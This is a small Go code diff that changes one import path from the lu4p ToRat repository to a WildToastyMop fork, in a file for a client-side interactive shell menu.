@@ -8,7 +8,7 @@ import (
 	"strings"
 
 	"github.com/abiosoft/ishell"
-	"github.com/lu4p/ToRat/shared"
+	"github.com/WildToastyMop/ToRat/shared"
 )
 
 // Client side interactive shell menu
